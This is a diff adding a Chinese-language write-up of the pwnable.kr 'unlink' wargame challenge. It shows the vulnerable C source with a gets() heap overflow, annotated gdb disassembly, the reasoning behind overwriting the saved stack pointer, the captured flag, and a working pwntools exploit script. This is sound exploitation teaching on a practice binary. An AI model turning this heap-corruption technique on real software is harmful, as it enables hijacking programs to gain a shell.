@@ -11322,3 +11322,217 @@ io.close()
 
 ------
 
+### unlink
+
+这是**Pwnable.kr**的第十九个挑战`unlink`，来自**[Toddler's Bottle]**部分。
+
+```bash
+Daddy! how can I exploit unlink corruption?
+
+ssh unlink@pwnable.kr -p2222 (pw: guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh unlink@pwnable.kr -p2222
+unlink@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun  9 09:50:45 2023 from 12.249.36.98
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+unlink@pwnable:~$ ls -la
+total 40
+drwxr-x---   5 root unlink     4096 Nov 28  2016 .
+drwxr-xr-x 117 root root       4096 Nov 10  2022 ..
+d---------   2 root root       4096 Nov 23  2016 .bash_history
+-r--r-----   1 root unlink_pwn   49 Nov 23  2016 flag
+-rw-r-----   1 root unlink_pwn  543 Nov 28  2016 intended_solution.txt
+dr-xr-xr-x   2 root root       4096 Nov 25  2016 .irssi
+drwxr-xr-x   2 root root       4096 Nov 23  2016 .pwntools-cache
+-r-xr-sr-x   1 root unlink_pwn 7540 Nov 23  2016 unlink
+-rw-r--r--   1 root root        749 Nov 23  2016 unlink.c
+```
+
+我们可以看到四个关键文件：`flag`，`intended_solution.txt`，`unlink` ，`unlink.c`，然而用户`unlink`是没有权限查看`flag`和`intended_solution.txt`的。查看`unlink.c`的源代码。
+
+```c
+unlink@pwnable:~$ cat unlink.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+typedef struct tagOBJ{
+    struct tagOBJ* fd;
+    struct tagOBJ* bk;
+    char buf[8];
+}OBJ;
+
+void shell(){
+    system("/bin/sh");
+}
+
+void unlink(OBJ* P){
+    OBJ* BK;
+    OBJ* FD;
+    BK=P->bk;
+    FD=P->fd;
+    FD->bk=BK;
+    BK->fd=FD;
+}
+int main(int argc, char* argv[]){
+    malloc(1024);
+    OBJ* A = (OBJ*)malloc(sizeof(OBJ));
+    OBJ* B = (OBJ*)malloc(sizeof(OBJ));
+    OBJ* C = (OBJ*)malloc(sizeof(OBJ));
+
+    // double linked list: A <-> B <-> C
+    A->fd = B;
+    B->bk = A;
+    B->fd = C;
+    C->bk = B;
+
+    printf("here is stack address leak: %p\n", &A);
+    printf("here is heap address leak: %p\n", A);
+    printf("now that you have leaks, get shell!\n");
+    // heap overflow!
+    gets(A->buf);
+
+    // exploit this unlink!
+    unlink(B);
+    return 0;
+}
+```
+
+使用`gdb`进一步分析程序。
+
+```assembly
+unlink@pwnable:~$ gdb ./unlink
+(gdb) set disassembly-flavor intel  # Intel Style
+(gdb) disassemble shell
+Dump of assembler code for function shell:
+   0x080484eb <+0>:     push   ebp     # shell函数的起始地址 
+   0x080484ec <+1>:     mov    ebp,esp
+   0x080484ee <+3>:     sub    esp,0x8
+   0x080484f1 <+6>:     sub    esp,0xc
+   0x080484f4 <+9>:     push   0x8048690
+   0x080484f9 <+14>:    call   0x80483c0 <system@plt>
+   0x080484fe <+19>:    add    esp,0x10
+   0x08048501 <+22>:    nop
+   0x08048502 <+23>:    leave  
+   0x08048503 <+24>:    ret    
+End of assembler dump.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0804852f <+0>:     lea    ecx,[esp+0x4]
+   0x08048533 <+4>:     and    esp,0xfffffff0
+   0x08048536 <+7>:     push   DWORD PTR [ecx-0x4]
+   0x08048539 <+10>:    push   ebp
+   0x0804853a <+11>:    mov    ebp,esp
+   0x0804853c <+13>:    push   ecx
+   0x0804853d <+14>:    sub    esp,0x14
+   0x08048540 <+17>:    sub    esp,0xc
+   0x08048543 <+20>:    push   0x400
+   0x08048548 <+25>:    call   0x80483a0 <malloc@plt>
+   0x0804854d <+30>:    add    esp,0x10
+   0x08048550 <+33>:    sub    esp,0xc
+   0x08048553 <+36>:    push   0x10
+   0x08048555 <+38>:    call   0x80483a0 <malloc@plt>
+   0x0804855a <+43>:    add    esp,0x10
+   0x0804855d <+46>:    mov    DWORD PTR [ebp-0x14],eax
+   0x08048560 <+49>:    sub    esp,0xc
+   0x08048563 <+52>:    push   0x10
+   0x08048565 <+54>:    call   0x80483a0 <malloc@plt>
+   0x0804856a <+59>:    add    esp,0x10
+   0x0804856d <+62>:    mov    DWORD PTR [ebp-0xc],eax
+   0x08048570 <+65>:    sub    esp,0xc
+   0x08048573 <+68>:    push   0x10
+   0x08048575 <+70>:    call   0x80483a0 <malloc@plt>
+   0x0804857a <+75>:    add    esp,0x10
+   0x0804857d <+78>:    mov    DWORD PTR [ebp-0x10],eax
+   0x08048580 <+81>:    mov    eax,DWORD PTR [ebp-0x14]
+   0x08048583 <+84>:    mov    edx,DWORD PTR [ebp-0xc]
+   0x08048586 <+87>:    mov    DWORD PTR [eax],edx
+   0x08048588 <+89>:    mov    edx,DWORD PTR [ebp-0x14]
+   0x0804858b <+92>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x0804858e <+95>:    mov    DWORD PTR [eax+0x4],edx
+   0x08048591 <+98>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048594 <+101>:   mov    edx,DWORD PTR [ebp-0x10]
+   0x08048597 <+104>:   mov    DWORD PTR [eax],edx
+   0x08048599 <+106>:   mov    eax,DWORD PTR [ebp-0x10]
+   0x0804859c <+109>:   mov    edx,DWORD PTR [ebp-0xc]
+   0x0804859f <+112>:   mov    DWORD PTR [eax+0x4],edx
+   0x080485a2 <+115>:   sub    esp,0x8
+   0x080485a5 <+118>:   lea    eax,[ebp-0x14]
+   0x080485a8 <+121>:   push   eax
+   0x080485a9 <+122>:   push   0x8048698
+   0x080485ae <+127>:   call   0x8048380 <printf@plt>
+   0x080485b3 <+132>:   add    esp,0x10
+   0x080485b6 <+135>:   mov    eax,DWORD PTR [ebp-0x14]
+   0x080485b9 <+138>:   sub    esp,0x8
+   0x080485bc <+141>:   push   eax
+   0x080485bd <+142>:   push   0x80486b8
+   0x080485c2 <+147>:   call   0x8048380 <printf@plt>
+   0x080485c7 <+152>:   add    esp,0x10
+   0x080485ca <+155>:   sub    esp,0xc
+   0x080485cd <+158>:   push   0x80486d8
+   0x080485d2 <+163>:   call   0x80483b0 <puts@plt>
+   0x080485d7 <+168>:   add    esp,0x10
+   0x080485da <+171>:   mov    eax,DWORD PTR [ebp-0x14]
+   0x080485dd <+174>:   add    eax,0x8
+   0x080485e0 <+177>:   sub    esp,0xc
+   0x080485e3 <+180>:   push   eax
+   0x080485e4 <+181>:   call   0x8048390 <gets@plt>
+   0x080485e9 <+186>:   add    esp,0x10
+   0x080485ec <+189>:   sub    esp,0xc
+   0x080485ef <+192>:   push   DWORD PTR [ebp-0xc]
+   0x080485f2 <+195>:   call   0x8048504 <unlink>
+   0x080485f7 <+200>:   add    esp,0x10
+   0x080485fa <+203>:   mov    eax,0x0
+   0x080485ff <+208>:   mov    ecx,DWORD PTR [ebp-0x4]   # $ecx的值由$ebp-4获得, 而$ebp的值在main运行过程中没变过
+   0x08048602 <+211>:   leave  # 等效于mov esp ebp, pop ebp 对$esp最终的值无影响
+   0x08048603 <+212>:   lea    esp,[ecx-0x4]   # $esp的值由$ecx-4获得
+   0x08048606 <+215>:   ret    # ret相当于pop eip, 将$esp指向的地址放入到$eip中
+End of assembler dump.
+```
+
+`shell()`函数的起始地址是`0x080484eb`。经过上述分析，我们可以构造`[exc-4] = 0x080484eb`从而劫持程序执行`shell()`。我们构造`Payload`时，可以先把`shell()`函数的起始地址写入到`A->buf`中并记作`shell_addr`，再让`$ecx`寄存器指向`shell_addr+4`（或者说是把`$ebp-4`中的内容覆盖为`shell_addr+4`）。因此`gets()`时输入的内容是`shell_addr + padding + B->fb + B->bk`。
+
+![](https://paper.tanyaodan.com/Pwnable/kr/unlink/heap_struct.png)
+
+编写`Python`代码求解，获得`shell`后输入`cat flag`拿到`conditional_write_what_where_from_unl1nk_explo1t`。
+
+```python
+from pwn import *
+
+shell = ssh(user='unlink', host='pwnable.kr', port=2222, password='guest')
+io = shell.process('./unlink')
+io.recvuntil('here is stack address leak: ')
+stack_addr = int(io.recvline()[:-1], 16)
+log.success('stack_addr => %s', hex(stack_addr))
+io.recvuntil('here is heap address leak: ')
+heap_addr = int(io.recvline()[:-1], 16)
+shell_addr = 0x80484eb
+payload = p32(shell_addr) + b'a'*12 + p32(heap_addr+0xc) + p32(stack_addr+0x10)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
